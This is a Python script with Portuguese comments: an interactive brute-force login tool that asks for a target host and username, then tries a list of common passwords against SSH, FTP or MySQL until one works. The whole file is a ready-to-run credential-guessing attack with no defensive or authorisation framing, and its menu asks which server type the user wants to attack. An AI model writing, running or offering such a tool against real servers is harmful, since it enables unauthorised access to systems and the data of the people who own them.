import paramiko
import ftplib
import mysql.connector
import time
from mysql.connector import connect, Error


def brute_force_ssh(host, port, username, password_list):
    """Tenta acessar o servidor SSH usando uma lista de senhas."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Ignora a verificação de chave do host

    for password in password_list:
        try:
            print(f"Tentando senha (SSH): {password}")
            client.connect(host, port=port, username=username, password=password, timeout=5)
            print(f"[+] Senha encontrada (SSH): {password}")
            return password  # Retorna a senha correta
        except paramiko.AuthenticationException:
            print(f"[-] Senha incorreta (SSH): {password}")
        except Exception as e:
            print(f"[!] Erro (SSH): {str(e)}")
        time.sleep(1)  # Delay entre as tentativas
    print("[!] Nenhuma senha válida encontrada (SSH).")
    return None


def brute_force_ftp(host, username, password_list):
    """Tenta acessar o servidor FTP usando uma lista de senhas."""
    for password in password_list:
        try:
            print(f"Tentando senha (FTP): {password}")
            ftp = ftplib.FTP(host)
            ftp.login(username, password)
            print(f"[+] Senha encontrada (FTP): {password}")
            return password  # Retorna a senha correta
        except ftplib.error_perm:
            print(f"[-] Senha incorreta (FTP): {password}")
        except Exception as e:
            print(f"[!] Erro (FTP): {str(e)}")
        time.sleep(1)  # Delay entre as tentativas
    print("[!] Nenhuma senha válida encontrada (FTP).")
    return None


def brute_force_mysql(host, username, password_list):
    """Tenta acessar o servidor MySQL usando uma lista de senhas."""
    for password in password_list:
        try:
            print(f"Tentando senha (MySQL): {password}")
            connection = connect(host=host, user=username, password=password)
            print(f"[+] Senha encontrada (MySQL): {password}")
            connection.close()
            return password  # Retorna a senha correta
        except Error as e:
            print(f"[-] Senha incorreta (MySQL): {password}")
        except Exception as e:
            print(f"[!] Erro (MySQL): {str(e)}")
        time.sleep(1)  # Delay entre as tentativas
    print("[!] Nenhuma senha válida encontrada (MySQL).")
    return None


def main():
    host = input("Digite o IP ou Host do servidor: ")
    username = input("Digite o nome de usuário: ")
    password_list = ["123456", "admin", "password", "12345", "qwerty"]  # Exemplo de lista de senhas

    print("\nEscolha o tipo de servidor que deseja atacar:")
    print("1. SSH")
    print("2. FTP")
    print("3. MySQL")

    escolha = input("Digite o número do tipo de servidor: ")

    if escolha == "1":
        port = int(input("Digite a porta do SSH (padrão é 22): ") or 22)
        print("\n[+] Iniciando brute force no SSH...\n")
        senha_encontrada = brute_force_ssh(host, port, username, password_list)

    elif escolha == "2":
        print("\n[+] Iniciando brute force no FTP...\n")
        senha_encontrada = brute_force_ftp(host, username, password_list)

    elif escolha == "3":
        print("\n[+] Iniciando brute force no MySQL...\n")
        senha_encontrada = brute_force_mysql(host, username, password_list)

    else:
        print("[!] Opção inválida. Encerrando.")
        return

    if senha_encontrada:
        print(f"\n[+] A senha correta é: {senha_encontrada}")
    else:
        print("[!] Não foi possível encontrar a senha correta.")


if __name__ == "__main__":
    main()
